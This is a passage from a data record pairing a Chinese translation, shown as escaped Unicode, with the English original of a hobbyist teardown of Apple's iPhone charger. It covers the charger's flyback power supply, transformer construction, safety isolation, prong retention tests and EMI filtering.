\u7f8e\u5143\u7684\u4ef7\u683c\u51fa\u552e\u4e00\u4e2a\u975e\u5e38\u76f8\u4f3c\u7684\u7acb\u65b9\u4f53\u5145\u7535\u5668\uff0c\u6211\u4e5f\u5c06\u5176\u62c6\u89e3\uff08\u7a0d\u540e\u4f1a\u5199\u51fa\u8be6\u7ec6\u4fe1\u606f\uff09\u3002 Apple \u5145\u7535\u5668\u8d28\u91cf\u66f4\u9ad8\uff0c\u6211\u4f30\u8ba1\u91cc\u9762\u6709\u5927\u7ea6\u4ef7\u503c\u4e00\u7f8e\u5143\u7684\u9644\u52a0\u7ec4\u4ef6\u3002 [14] \u4f46\u5b83\u200b\u200b\u7684\u552e\u4ef7\u8981\u9ad8\u51fa 20 \u7f8e\u5143\u3002 2008 \u5e74\uff0c\u82f9\u679c\u516c\u53f8\u53ec\u56de\u4e86 iPhone \u5145\u7535\u5668\uff0c\u539f\u56e0\u662f\u4ea4\u6d41\u63d2\u5934\u53ef\u80fd\u4f1a\u4ece\u5145\u7535\u5668\u4e0a\u8131\u843d\u5e76\u5361\u5728\u63d2\u5ea7\u4e2d\u3002 [15]\u6709\u95ee\u9898\u7684\u5145\u7535\u5668\u7684\u63d2\u811a\u4e0a\u9644\u6709\u88ab\u63cf\u8ff0\u4e3a\u53ea\u4e0d\u8fc7\u662f\u80f6\u6c34\u548c\u201c\u4e00\u53a2\u60c5\u613f\u201d\u7684\u4e1c\u897f\u3002 [15]Apple \u5c06\u5145\u7535\u5668\u66f4\u6362\u4e3a\u91cd\u65b0\u8bbe\u8ba1\u7684\u578b\u53f7\uff0c\u5982\u4e0a\u56fe\u6240\u793a\u7684\u7eff\u70b9\u6807\u8bb0\u6240\u793a\uff08\u5047\u5192\u5145\u7535\u5668\u4e0d\u53ef\u907f\u514d\u5730\u4f1a\u6a21\u4eff\uff09\u3002\u6211\u51b3\u5b9a\u770b\u770b\u82f9\u679c\u5728\u66f4\u6362\u5145\u7535\u5668\u4e0a\u505a\u4e86\u54ea\u4e9b\u5b89\u5168\u6539\u8fdb\uff0c\u5e76\u4e0e\u5176\u4ed6\u7c7b\u4f3c\u7684\u5145\u7535\u5668\u8fdb\u884c\u6bd4\u8f83\u3002\u6211\u5c1d\u8bd5\u62d4\u51fa Apple \u5145\u7535\u5668\u3001\u4e09\u661f\u5145\u7535\u5668\u548c\u5047\u5192\u5145\u7535\u5668\u7684\u63d2\u811a\u3002\u5047\u5192\u7684\u722a\u5b50\u662f\u7528\u94b3\u5b50\u62c9\u51fa\u6765\u7684\uff0c\u56e0\u4e3a\u9664\u4e86\u6469\u64e6\u4e4b\u5916\uff0c\u57fa\u672c\u4e0a\u6ca1\u6709\u4efb\u4f55\u4e1c\u897f\u53ef\u4ee5\u56fa\u5b9a\u5b83\u4eec\u3002\u4e09\u661f\u7684\u53c9\u5b50\u7528\u94b3\u5b50\u8fdb\u884c\u4e86\u591a\u6b21\u62c9\u52a8\u548c\u626d\u66f2\uff0c\u56e0\u4e3a\u5b83\u4eec\u6709\u5c0f\u91d1\u5c5e\u7247\u5c06\u5b83\u4eec\u56fa\u5b9a\u5230\u4f4d\uff0c\u4f46\u6700\u7ec8\u5b83\u4eec\u51fa\u6765\u4e86\u3002\u5f53\u6211\u7ee7\u7eed\u4f7f\u7528 Apple \u5145\u7535\u5668\u65f6\uff0c\u5373\u4f7f\u6211\u7528\u94b3\u5b50\u6700\u7528\u529b\u5730\u62c9\uff0c\u63d2\u811a\u4e5f\u6ca1\u6709\u79fb\u52a8\uff0c\u6240\u4ee5\u6211\u62ff\u51fa Dremel \u5e76\u901a\u8fc7\u5916\u58f3\u78e8\u5149\uff0c\u4ee5\u627e\u51fa\u56fa\u5b9a\u63d2\u811a\u7684\u4e1c\u897f\u3002\u5b83\u4eec\u5d4c\u5165\u4e86\u5927\u91d1\u5c5e\u6cd5\u5170\u5728\u5916\u58f3\u7684\u5851\u6599\u4e2d\uff0c\u56e0\u6b64\u5728\u635f\u574f\u5145\u7535\u5668\u7684\u60c5\u51b5\u4e0b\uff0c\u63d2\u811a\u4e0d\u53ef\u80fd\u677e\u52a8\u3002\u7167\u7247\u663e\u793a\u4e86 Apple \u63d2\u5934\uff08\u6ce8\u610f\u4ece\u53f3\u534a\u90e8\u5206\u53d6\u4e0b\u7684\u5851\u6599\u539a\u5ea6\uff09\u3001\u4ec5\u901a\u8fc7\u6469\u64e6\u56fa\u5b9a\u7684\u5047\u5192\u5145\u7535\u5668\u7684\u63d2\u811a\uff0c\u4ee5\u53ca\u7531\u5c0f\u800c\u575a\u56fa\u7684\u91d1\u5c5e\u7247\u56fa\u5b9a\u7684\u4e09\u661f\u63d2\u811a\u3002\u82f9\u679c\u5728\u53ec\u56de\u540e\u4e3a\u4f7f\u5145\u7535\u5668\u66f4\u5b89\u5168\u6240\u505a\u7684\u52aa\u529b\u7ed9\u6211\u7559\u4e0b\u4e86\u6df1\u523b\u7684\u5370\u8c61\u3002\u4ed6\u4eec\u4e0d\u4ec5\u7a0d\u5fae\u6539\u8fdb\u4e86\u9576\u722a\u4ee5\u4f7f\u5176\u66f4\u5b89\u5168\uff1b\u663e\u7136\u6709\u4eba\u88ab\u544a\u77e5\u8981\u5c3d\u4e00\u5207\u52aa\u529b\u786e\u4fdd\u5728\u4efb\u4f55\u60c5\u51b5\u4e0b\u90fd\u7edd\u5bf9\u4e0d\u53ef\u80fd\u4f7f\u9576\u722a\u518d\u6b21\u677e\u52a8\u3002 Apple \u7684\u7535\u6e90\u9002\u914d\u5668\u663e\u7136\u662f\u4e00\u6b3e\u9ad8\u54c1\u8d28\u7535\u6e90\uff0c\u65e8\u5728\u4ea7\u751f\u7ecf\u8fc7\u7cbe\u5fc3\u8fc7\u6ee4\u7684\u7535\u6e90\u3002\u82f9\u679c\u663e\u7136\u5df2\u7ecf\u4ed8\u51fa\u4e86\u989d\u5916\u7684\u52aa\u529b\u6765\u51cf\u5c11 EMI \u5e72\u6270\uff0c\u53ef\u80fd\u662f\u4e3a\u4e86\u9632\u6b62\u5145\u7535\u5668\u5e72\u6270\u89e6\u6478\u5c4f\u3002 [16] \u5f53\u6211\u6253\u5f00\u5145\u7535\u5668\u65f6\uff0c\u6211\u5e0c\u671b\u80fd\u627e\u5230\u4e00\u4e2a\u6807\u51c6\u7684\u8bbe\u8ba1\uff0c\u4f46\u6211\u5df2\u7ecf\u5c06\u5145\u7535\u5668\u4e0e\u4e09\u661f\u5145\u7535\u5668\u548c\u5176\u4ed6\u51e0\u4e2a\u9ad8\u8d28\u91cf\u7684\u884c\u4e1a\u8bbe\u8ba1\u8fdb\u884c\u4e86\u6bd4\u8f83\uff0c[17] \u82f9\u679c\u5728\u51e0\u4e2a\u65b9\u9762\u8d85\u8d8a\u4e86\u8fd9\u4e9b\u8bbe\u8ba1.\u8f93\u5165\u4ea4\u6d41\u7535\u901a\u8fc7\u5851\u6599\u5916\u58f3\u4e0a\u7684\u4e00\u4e2a\u5c0f\u94c1\u6c27\u4f53\u73af\u8fc7\u6ee4\uff08\u89c1\u4e0b\u56fe\uff09\u3002\u4e8c\u6781\u7ba1\u6865\u8f93\u51fa\u7531\u4e24\u4e2a\u5927\u7535\u5bb9\u548c\u4e00\u4e2a\u7535\u611f\u6ee4\u6ce2\u3002\u53e6\u5916\u4e24\u4e2a RC \u7f13\u51b2\u5668\u5bf9\u4e8c\u6781\u7ba1\u7535\u6865\u8fdb\u884c\u6ee4\u6ce2\uff0c\u6211\u53ea\u5728\u97f3\u9891\u7535\u6e90\u7684\u5176\u4ed6\u5730\u65b9\u770b\u5230\u8fc7\u5b83\u4ee5\u9632\u6b62 60Hz \u55e1\u55e1\u58f0\uff1b [6] \u4e5f\u8bb8\u8fd9\u4f1a\u589e\u5f3a iTunes \u7684\u8046\u542c\u4f53\u9a8c\u3002\u6211\u62c6\u8fc7\u7684\u5176\u4ed6\u5145\u7535\u5668\u6ca1\u6709\u4f7f\u7528\u94c1\u6c27\u4f53\u73af\uff0c\u901a\u5e38\u53ea\u6709\u4e00\u4e2a\u6ee4\u6ce2\u7535\u5bb9\u3002\u4e3b\u7535\u8def\u677f\u5728\u9ad8\u9891\u7ec4\u4ef6\u4e0a\u6709\u4e00\u4e2a\u63a5\u5730\u7684\u91d1\u5c5e\u5c4f\u853d\u5c42\uff08\u89c1\u7167\u7247\uff09\uff0c\u6211\u5728\u5176\u4ed6\u5730\u65b9\u6ca1\u6709\u770b\u5230\u8fc7\u3002\u53d8\u538b\u5668\u5305\u62ec\u4e00\u4e2a\u5c4f\u853d\u7ed5\u7ec4\u4ee5\u5438\u6536 EMI\u3002\u8f93\u51fa\u7535\u8def\u4f7f\u7528\u4e09\u4e2a\u7535\u5bb9\u5668\uff0c\u5305\u62ec\u4e24\u4e2a\u76f8\u5bf9\u6602\u8d35\u7684\u94bd\u7535\u5bb9\u5668 [14] \u548c\u4e00\u4e2a\u7528\u4e8e\u6ee4\u6ce2\u7684\u7535\u611f\u5668\uff0c\u800c\u8bb8\u591a\u7535\u6e90\u53ea\u4f7f\u7528\u4e00\u4e2a\u7535\u5bb9\u5668\u3002\u5176\u4ed6\u8bbe\u8ba1\u4e2d\u901a\u5e38\u4f1a\u7701\u7565 Y \u7535\u5bb9\u5668\u3002\u8c10\u632f\u94b3\u4f4d\u7535\u8def\u5177\u6709\u9ad8\u5ea6\u521b\u65b0\u6027\u3002 [9] Apple \u7684\u8bbe\u8ba1\u4ee5\u524d\u9762\u8ba8\u8bba\u8fc7\u7684\u51e0\u79cd\u65b9\u5f0f\u63d0\u4f9b\u4e86\u989d\u5916\u7684\u5b89\u5168\u6027\uff1a\u8d85\u5f3a\u4ea4\u6d41\u7535\u63d2\u811a\uff0c\u4ee5\u53ca\u590d\u6742\u7684\u8fc7\u6e29/\u8fc7\u538b\u5173\u65ad\u7535\u8def\u3002\u82f9\u679c\u7684\u521d\u7ea7\u548c\u6b21\u7ea7\u4e4b\u95f4\u7684\u9694\u79bb\u8ddd\u79bb\u4f3c\u4e4e\u8d85\u51fa\u4e86\u89c4\u5b9a\u3002 Apple \u7684 iPhone \u5145\u7535\u5668\u5c06\u5927\u91cf\u6280\u672f\u585e\u8fdb\u4e86\u4e00\u4e2a\u72ed\u5c0f\u7684\u7a7a\u95f4\u3002\u4e0e\u5176\u4ed6\u540d\u724c\u5145\u7535\u5668\u76f8\u6bd4\uff0cApple \u4ed8\u51fa\u4e86\u989d\u5916\u7684\u52aa\u529b\u6765\u63d0\u4f9b\u66f4\u9ad8\u7684\u8d28\u91cf\u548c\u5b89\u5168\u6027\uff0c\u4f46\u8fd9\u79cd\u8d28\u91cf\u9700\u8981\u4ed8\u51fa\u9ad8\u6602\u7684\u4ee3\u4ef7\u3002\u5982\u679c\u60a8\u5bf9\u7535\u6e90\u611f\u5174\u8da3\uff0c\u8bf7\u67e5\u770b\u6211\u7684\u5176\u4ed6\u6587\u7ae0\uff1a\u5c0f\u5de7\u3001\u5ec9\u4ef7\u3001\u5371\u9669\uff1a\u5728\uff08\u5047\uff09iPhone \u5145\u7535\u5668\u5185\u90e8\uff0c\u6211\u5728\u90a3\u91cc\u62c6\u5f00\u4e86\u4e00\u4e2a 2.79 \u7f8e\u5143\u7684 iPhone \u5145\u7535\u5668\uff0c\u53d1\u73b0\u5b83\u8fdd\u53cd\u4e86\u8bb8\u591a\u5b89\u5168\u89c4\u5219\uff1b\u4e0d\u8981\u8d2d\u4e70\u5176\u4e2d\u4e4b\u4e00\u3002\u8fd8\u8981\u770b\u770b Apple \u5e76\u6ca1\u6709\u5f7b\u5e95\u6539\u53d8\u7535\u6e90\uff1b\u65b0\u6676\u4f53\u7ba1\u68c0\u67e5\u4e86\u5f00\u5173\u7535\u6e90\u7684\u5386\u53f2\u3002\u8981\u67e5\u770b\u62c6\u89e3 Apple \u7684\u9002\u914d\u5668\uff0c\u8bf7\u67e5\u770b\u7531 scourtheearth \u548c Ladyada \u5236\u4f5c\u7684\u89c6\u9891\u3002\u6700\u540e\uff0c\u5982\u679c\u60a8\u8eab\u8fb9\u6709\u4e00\u4e2a\u60a8\u4e0d\u60f3\u8981\u7684\u6709\u8da3\u5145\u7535\u5668\uff0c\u8bf7\u5c06\u5176\u53d1\u9001\u7ed9\u6211\uff0c\u4e5f\u8bb8\u6211\u4f1a\u5199\u51fa\u8be6\u7ec6\u7684\u62c6\u89e3\u8bf4\u660e\u3002\u53e6\u8bf7\u53c2\u9605 Hacker News \u4e0a\u7684\u8bc4\u8bba\u3002 [1]\u60a8\u53ef\u80fd\u60f3\u77e5\u9053\u4e3a\u4ec0\u4e48\u7535\u6e90\u5185\u90e8\u7684\u76f4\u6d41\u7535\u538b\u8fdc\u9ad8\u4e8e\u7ebf\u8def\u7535\u538b\u3002\u76f4\u6d41\u7535\u538b\u5927\u7ea6\u662f\u4ea4\u6d41\u7535\u538b\u7684 sqrt(2) \u500d\uff0c\u56e0\u4e3a\u4e8c\u6781\u7ba1\u5c06\u7535\u5bb9\u5668\u5145\u7535\u5230\u4ea4\u6d41\u4fe1\u53f7\u7684\u5cf0\u503c\u3002\u56e0\u6b64\uff0c100 \u81f3 240 \u4f0f\u4ea4\u6d41\u8f93\u5165\u5728\u5185\u90e8\u8f6c\u6362\u4e3a 145 \u81f3 345 \u4f0f\u76f4\u6d41\u7535\u538b\u3002\u8fd9\u4e0d\u8db3\u4ee5\u6210\u4e3a\u6b63\u5f0f\u7684\u9ad8\u538b\uff0c\u4f46\u4e3a\u4e86\u65b9\u4fbf\u8d77\u89c1\uff0c\u6211\u5c06\u5176\u79f0\u4e3a\u9ad8\u538b\u3002\u6839\u636e\u6807\u51c6\uff0c\u4efb\u4f55\u4f4e\u4e8e 50 \u4f0f\u4ea4\u6d41\u7535\u6216 120 \u4f0f\u76f4\u6d41\u7535\u7684\u4e1c\u897f\u90fd\u88ab\u8ba4\u4e3a\u662f\u8d85\u4f4e\u7535\u538b\uff0c\u5728\u6b63\u5e38\u6761\u4ef6\u4e0b\u88ab\u8ba4\u4e3a\u662f\u5b89\u5168\u7684\u3002\u4f46\u4e3a\u4e86\u65b9\u4fbf\u8d77\u89c1\uff0c\u6211\u5c06 5V \u8f93\u51fa\u79f0\u4e3a\u4f4e\u7535\u538b\u3002 [2] Apple \u7535\u6e90\u91c7\u7528\u53cd\u6fc0\u5f0f\u8bbe\u8ba1\uff0c\u5176\u4e2d\u53d8\u538b\u5668\u4ee5\u60a8\u9884\u671f\u7684\u201c\u53cd\u5411\u201d\u8fd0\u884c\u3002\u5f53\u7535\u538b\u8109\u51b2\u88ab\u53d1\u9001\u5230\u53d8\u538b\u5668\u65f6\uff0c\u8f93\u51fa\u4e8c\u6781\u7ba1\u4f1a\u963b\u6b62\u8f93\u51fa\uff0c\u56e0\u6b64\u6ca1\u6709\u8f93\u51fa - \u800c\u662f\u4f1a\u5efa\u7acb\u78c1\u573a\u3002\u5f53\u7535\u538b\u8f93\u5165\u505c\u6b62\u65f6\uff0c\u78c1\u573a\u5d29\u6e83\u5bfc\u81f4\u53d8\u538b\u5668\u8f93\u51fa\u7535\u538b\u3002\u53cd\u6fc0\u7535\u6e90\u5728\u4f4e\u74e6\u6570\u7535\u6e90\u4e2d\u5f88\u5e38\u89c1\u3002 [3]\u4e3b\u677f\u5c3a\u5bf8\u7ea6\u4e3a 22.5mm x 20.0mm\uff0c\u800c\u526f\u677f\u5c3a\u5bf8\u7ea6\u4e3a 22.2mm x 20.2mm\u3002 [4]\u6709\u5173 X \u548c Y \u7535\u5bb9\u5668\u7684\u66f4\u591a\u4fe1\u606f\uff0c\u8bf7\u53c2\u9605 Kemet \u7684\u6f14\u793a\u6587\u7a3f\u548c\u8bbe\u8ba1\u4f4e\u6f0f\u7535\u6d41\u7535\u6e90\u3002 [5] \u4e3a\u6e05\u695a\u8d77\u89c1\uff0c\u672c\u6587\u5728\u62cd\u6444\u7167\u7247\u4e4b\u524d\u53bb\u9664\u4e86\u4e00\u4e9b\u7edd\u7f18\u6750\u6599\u3002 Y\u7535\u5bb9\u4e0a\u8986\u76d6\u7740\u9ed1\u8272\u70ed\u7f29\u7ba1\uff0c\u7535\u8def\u4fa7\u9762\u6709\u80f6\u5e26\uff0c\u6613\u7194\u7535\u963b\u4e0a\u8986\u76d6\u7740\u9ed1\u8272\u70ed\u7f29\u7ba1\uff0cUSB\u8fde\u63a5\u5668\u4e0a\u6709\u4e00\u4e2a\u9ed1\u8272\u7edd\u7f18\u76d6\u3002 [6] \u7f13\u51b2\u7535\u8def\u53ef\u7528\u4e8e\u51cf\u5c11\u97f3\u9891\u7535\u6e90\u4e2d\u4e8c\u6781\u7ba1\u6865\u4ea7\u751f\u7684 60 Hz \u55e1\u55e1\u58f0\u3002\u97f3\u9891\u7535\u6e90\u4e8c\u6781\u7ba1\u7684 RC \u7f13\u51b2\u5668\u7684\u8be6\u7ec6\u53c2\u8003\u662f\u8ba1\u7b97\u6700\u4f73\u7f13\u51b2\u5668\uff0c\u6837\u672c\u8bbe\u8ba1\u662f\u97f3\u9891\u653e\u5927\u5668\u7535\u6e90\u8bbe\u8ba1\u3002 [7]\u7535\u6e90\u7531L6565\u51c6\u8c10\u632fSMPS\uff08switched-mode power supply\uff09\u63a7\u5236\u5668\u82af\u7247\uff08datasheet\uff09\u63a7\u5236\u3002 \uff08\u5f53\u7136\uff0c\u8be5\u82af\u7247\u53ef\u80fd\u662f\u522b\u7684\u4e1c\u897f\uff0c\u4f46\u8be5\u7535\u8def\u4e0e L6565 \u5b8c\u5168\u5339\u914d\uff0c\u6211\u68c0\u67e5\u8fc7\u7684\u5176\u4ed6\u82af\u7247\u90fd\u6ca1\u6709\u3002\uff09\u4e3a\u4e86\u63d0\u9ad8\u6548\u7387\u5e76\u51cf\u5c11\u5e72\u6270\uff0c\u8be5\u82af\u7247\u4f7f\u7528\u4e86\u4e00\u79cd\u79f0\u4e3a\u51c6\u8c10\u632f\u7684\u6280\u672f\uff0c\u8be5\u6280\u672f\u6700\u521d\u662f\u57281980 \u5e74\u4ee3\u3002\u8f93\u51fa\u7535\u8def\u8bbe\u8ba1\u4e3a\u5f53\u7535\u6e90\u5173\u95ed\u65f6\uff0c\u53d8\u538b\u5668\u7535\u538b\u4f1a\u53d1\u751f\u632f\u8361\u3002\u5f53\u7535\u538b\u8fbe\u5230\u96f6\u65f6\uff0c\u6676\u4f53\u7ba1\u91cd\u65b0\u5f00\u542f\u3002\u8fd9\u88ab\u79f0\u4e3a\u96f6\u7535\u538b\u5f00\u5173\uff0c\u56e0\u4e3a\u6676\u4f53\u7ba1\u5728\u5176\u4e24\u7aef\u57fa\u672c\u4e0a\u6ca1\u6709\u7535\u538b\u65f6\u8fdb\u884c\u5f00\u5173\uff0c\u4ece\u800c\u6700\u5927\u9650\u5ea6\u5730\u51cf\u5c11\u6d6a\u8d39......", "note_en": "This article is now available in Vietnamese  B\u1ed9 s\u1ea1c iPhone c\u1ee7a Apple.\nDisassembling Apple&#39;s diminutive inch-cube iPhone charger reveals a technologically advanced flyback switching power supply that goes beyond the typical charger. It simply takes AC input (anything between 100 and 240 volts) and produce 5 watts of smooth 5 volt power, but the circuit to do this is surprisingly complex and innovative. The iPhone power adapter is a switching power supply, where the input power is switched on and off about 70,000 times a second in order to get the exact output voltage required. Because of their design, switching power supplies are generally compact and efficient and generate little waste heat compared to simpler linear power supplies. In more detail, the AC line power is first converted to high voltage DC [1] by a diode bridge. The DC is switched on and off by a transistor controlled by a power supply controller IC. The chopped DC is fed into a flyback [2] transformer which converts it into low voltage AC. Finally, this AC is converted into DC which is filtered to obtain smooth power free of interference, and this power is output through the USB jack. A feedback circuit measures the output voltage and sends a signal to the controller IC, which adjusts the switching frequency to obtain the desired voltage. The side view above shows some of the larger components.The charger consists of two circuit boards, slightly under one inch square each. [3] The top board is the primary, which has the high voltage circuitry, and the bottom board, the secondary, has the low voltage output circuitry.The input AC first passes through a fusible resistor (striped), which will break the circuit if there is a catastrophic overload. The input AC is converted to high-voltage DC, which is smoothed by the two large electrolytic capacitors (black with white text and stripe) and the inductor (green). Next, the high voltage DC is chopped at high frequency by a MOSFET switching transistor, which is the large three-pinned component in the upper left. (The second transistor clamps voltage spikes, as will be explained below.) The chopped DC goes to the flyback transformer (yellow, barely visible behind the transistors), which has low voltage output wires going to the secondary board below. (These wires were cut during disassembly.) The secondary board converts the low voltage from the transformer to DC, filters it, and then feeds it out through the USB connector (the silver rectangle in the lower left). The gray ribbon cable (just barely visible on the lower right under the capacitor) provides feedback from the secondary board to the controller IC to keep the voltage regulated. The picture above shows the flyback transformer (yellow) more clearly, above the USB jack. The large blue component is a special &#34;Y&#34; capacitor [4] to reduce interference.The controller IC is visible above the transformer on the top of the primary board. [5]      The primary circuit board is packed with surface mounted components on both sides. The inner side (diagram above) holds the large components while the outer side (diagram below) has the controller IC. (The large components were removed in the diagrams, and are indicated in italics.)Input power is connected to the corners of the board, goes through the 10&amp;ohm fusible resistor, and is rectified to DC by the four diodes.Two R-C snubber circuits absorb EMI interference created by the bridge. [6]The DC is filtered by the two large electrolytic capacitors and the inductor, producing 125-340V DC. Note the thickness of the circuit board traces connecting these capacitors and other high-current components compared to the thin control traces. The power supply is controlled by an 8-pin STMicrosystems L6565 quasi-resonant SMPS controller chip. [7]The controller IC drives the MOSFET switching transistor which chops the high voltage DC and feeds it into the primary winding of the flyback transformer.The controller IC takes a variety of inputs (secondary voltage feedback, input DC voltage, transformer primary current, and transformer demagnetization sensing) and adjusts the switching frequency and timing to control the output voltage through complex internal circuitry.The current sense resistors let the IC know how much current is flowing through the primary, which controls when the transistor should be turned off. The second switching transistor, along with some capacitors and diodes, is part of a resonant clamp circuit that absorbs voltage spikes on the transformer. This unusual and innovative circuit is patented by Flextronics. [8] [9] The controller IC needs DC power to run; this is provided by an auxiliary power circuit consisting of a separate auxiliary winding on the transformer, a diode, and filter capacitors. Since the controller IC needs to be powered up before the transformer can start generating power, you might wonder how this chicken-and-egg problem gets solved. The solution is the high-voltage DC is dropped to a low level through startup power resistors to provide the initial power to the IC until the transformer starts up. The auxiliary winding is also used by the IC to sense transformer demagnitization, which indicates when to turn on the switching transistor. [7] On the secondary board, the low voltage AC from the transformer is rectified by the high-speed Schottky diode, filtered by the inductor and capacitors, and connected to the USB output. The tantalum filter capacitors provide high capacitance in a small package. The USB output also has specific resistances connected to the data pins to indicate to the iPhone how much current the charger can supply, through a proprietary Apple protocol. [10] An iPhone displays the message &#34;Charging is not supported with this accessory&#34; if the charger has the wrong resistances here. The secondary board contains a standard switching power supply feedback circuit that monitors the output voltage with a TL431 regulator and provides feedback to the controller IC through the optocoupler. A second feedback circuit shuts down the charger for protection if the charger overheats or the output voltage is too high. [11] A ribbon cable provides this feedback to the primary board. Because the power supply can have up to 340V DC internally, safety is an important issue. Strict regulations govern the separation between the dangerous line voltage and the safe output voltage, which are isolated by a combination of distance (called creepage and clearance), and insulation. The standards [12] are somewhat incomprehensible, but roughly 4mm of distance is required between the two circuits. (As I discuss in  Tiny, cheap, dangerous: Inside a (fake) iPhone charger, cheap chargers totally ignore these safety rules.) You might expect the primary board to have the dangerous voltages and the secondary board to have the safe voltages, but the secondary board consists of two areas: the hazardous area connected to the primary board, and the low-voltage area. The isolation boundary between these areas is about 6mm in the Apple charger and can be seen in the above diagram. This isolation boundary ensures that dangerous voltages cannot reach the output. There are three types of components that cross the isolation boundary, and they must be specially designed for safety. The key component is the transformer, which provides a way for electrical power to reach the output without a direct electrical connection. Internally, the transformer is extensively insulated, as will be shown below. The second component type is the optocouplers, which send the feedback signal from the secondary to the primary. Internally, the optocoupler contains a LED and a photo-transistor, so the two sides are connected only by light, not by an electrical circuit. (Note the silicone insulation on the secondary side of the optocouplers to provide extra safety.) Finally, the Y capacitor is a special type of capacitor [4] that lets EMI (electromagnetic interference) escape between the high-voltage primary and the low-voltage secondary. The above picture shows some of the isolation techniques. The secondary board (left) has the blue Y capacitor. Note the lack of components in the middle of the secondary board, forming an isolation boundary. The components on the right of the secondary board are connected to the primary board by the gray ribbon cable so they are at potentially high voltages.The other connection between the boards is the pair of wires from the flyback transformer (yellow) delivering the output power to the secondary board; these were cut to separate the boards. I&#39;ve put together an approximate schematic showing the charger circuit. [13] Click for a larger version. Looking at these pictures, it&#39;s easy to lose track of how very small these components are, and how the charger crams all this complexity into one inch. The following slightly magnified picture shows a quarter, a grain of rice, and a mustard seed to give a size comparison.Most of the components are  surface-mount devices which are soldered directly to the printed circuit board. The smallest components, such as the resistor pointed out in the picture, are known as &#34;0402&#34; size since they are .04 inches by .02 inches. The larger resistors to the left of the mustard seed handle more power and are known as &#34;0805&#34; size since they are .08 x .05 inches. The flyback transformer is the key component of the charger, the largest component, and probably the most expensive. [14] But what&#39;s inside? I took apart the transformer to find out. The transformer measures roughly 1/2&#34; by 1/2&#34; by 1/3&#34;. Inside, the transformer has three windings: a high voltage primary input winding, a low voltage auxiliary winding to provide power to the control circuits, and a high-current low voltage output winding. The output winding is connected to the black and white wires coming out of the transformer, while the other windings are connected to the pins attached to the bottom of the transformer. The outside of the transformer has a couple layers of insulating tape. The second line appears to start with &#34;FLEX&#34;, for Flextronics. Two grounded strands of wire are wrapped around the outside of the transformer to provide shielding. After removing the shielding and the tape, the two halves of the ferrite core can be removed from the windings. Ferrite is a rather brittle ceramic material, so the core broke during removal. The core surrounds the windings and contains the magnetic fields. Each core piece is roughly 6mm x 11mm x 4mm; this style of core is known as EQ. The circular center section is very slightly shorter than the ends, creating a small air gap when the core pieces are put together. This 0.28mm air gap stores the magnetic energy for the flyback transformer. Underneath the next two layers of tape is a 17-turn winding of thin varnished wire, which I think is another shield winding to return stray interference to ground. Underneath the shield and another two layers of tape is the 6-turn secondary output winding that is connected to the black and white wires. Note that this winding is heavy-gauge wire, since it is feeding the 1A output. Also note that the winding is triple-insulated, which is a UL safety requirement to ensure that the high voltage primary remains isolated from the output. This is one place where cheap chargers cheat - they just use regular wire instead of triple-insulated, and also skimp on the tape. The result is there&#39;s not much protecting you from high voltage if there&#39;s an insulation flaw or power surge. Under the next double layer of tape is the 11-turn heavy gauge primary power winding, that powers the controller IC. Since this winding is on the primary side, it doesn&#39;t need to be triple insulated. It&#39;s just insulated with a thin layer of varnish. Under the final double layer of tape is the primary input winding, which is 4 layers of approximately 23 turns each. This winding receives the high voltage input. Since the current is very low, the wire can be very thin. Because the primary has about 15 times as many turns as the secondary winding, the secondary voltage will be 1/15 the primary voltage, but 15 times the current. Thus, the transformer converts the high voltage input to low voltage, high current output. The final picture shows all the components of the transformer; left to right shows the layers from the outside tape to the innermost winding and bobbin. I was surprised to realize how enormous Apple&#39;s profit margins must be on these chargers. These chargers  sell for about $30  (if not counterfeit), but that must be almost all profit. Samsung sells a very similar cube charger  for about $6-$10, which I also disassembled (and will write up details later). The Apple charger is higher quality and I estimate has about a dollar&#39;s worth of additional components inside. [14] But it sells for $20 more.  In 2008, Apple recalled the iPhone chargers due to a defect that the AC prongs could fall off the charger and get stuck in an outlet. [15]The faulty chargers had the prongs attached with what was described as little more than glue and &#34;wishful thinking&#34;. [15]Apple replaced the chargers with a redesigned model indicated by the green dot marking shown above (which counterfeit chargers inevitably imitate). I decided to see what safety improvements Apple made in the replacement charger, and compare with other similar chargers. I tried pulling out the prongs of the Apple charger, a Samsung charger, and a counterfeit charger. The counterfeit prongs came out with a tug with pliers, as there&#39;s basically nothing anchoring them but friction. The Samsung prongs took a lot of pulling and twisting with pliers, since they have little metal tabs holding them in place, but eventually they came out. When I moved on to the Apple charger, the prongs didn&#39;t budge, even with my hardest pulling with pliers, so I got out the Dremel and ground through the case to find out what was holding the prongs.They have large metal flanges embedded in the plastic of the case, so there&#39;s no way a prong can come loose short of the destruction of the charger. The photo shows the Apple plug (note the thickness of plastic removed from the right half), the prong from the counterfeit charger held in only by friction, and the Samsung prong held in by small but sturdy metal tabs. I&#39;m impressed with the effort Apple put into making the charger more safe after the recall. They didn&#39;t just improve the prongs slightly to make them more secure; clearly someone was told to do whatever it takes to make sure there&#39;s absolutely no way the prongs could possibly come loose again under any circumstances. Apple&#39;s power adapter is clearly a high-quality power supply designed to produce carefully filtered power. Apple has obviously gone to extra effort to reduce EMI interference, probably to keep the charger from interfering with the touchscreen. [16] When I opened the charger up, I expected to find a standard design, but I&#39;ve compared the charger to the Samsung charger and several other high-quality industry designs, [17] and Apple goes beyond these designs in several ways. The input AC is filtered thorugh a tiny ferrite ring on the plastic case (see photo below). The diode bridge output is filtered by two large capacitors and an inductor. Two other R-C snubbers filter the diode bridge, which I&#39;ve only seen elsewhere in audio power supplies to prevent 60Hz hum; [6] perhaps this enhances the iTunes listening experience. Other chargers I disassembled don&#39;t use a ferrite ring and usually only a single filter capacitor. The primary circuit board has a grounded metal shield over the high-frequency components (see photo), which I haven&#39;t seen elsewhere. The transformer includes a shield winding to absorb EMI. The output circuit uses three capacitors including two relatively expensive tantalum ones [14] and an inductor for filtering, when many supplies just use one capacitor. The Y capacitor is usually omitted from other designs. The resonant clamp circuit is highly innovative. [9] Apple&#39;s design provides extra safety in a few ways that were discussed earlier: the super-strong AC prongs, and the complex over-temperature / over-voltage shutdown circuit. Apple&#39;s isolation distance between primary and secondary appears to go beyond the regulations. Apple&#39;s iPhone charger crams a lot of technology into a small space. Apple went to extra effort to provide higher quality and safety than other name-brand chargers, but this quality comes at a high cost. If you&#39;re interested in power supplies, please take a look at my other articles:   tiny, cheap, dangerous: Inside a (fake) iPhone charger, where I disassemble a $2.79 iPhone charger and discover that it violates many safety rules; don&#39;t buy one of these. Also take a look at  Apple didn&#39;t revolutionize power supplies; new transistors did which examines the history of switching power supplies. To see Apple&#39;s adapter disassembled, check out videos created by  scourtheearth and  Ladyada. Finally, if you have an interesting charger lying around that you 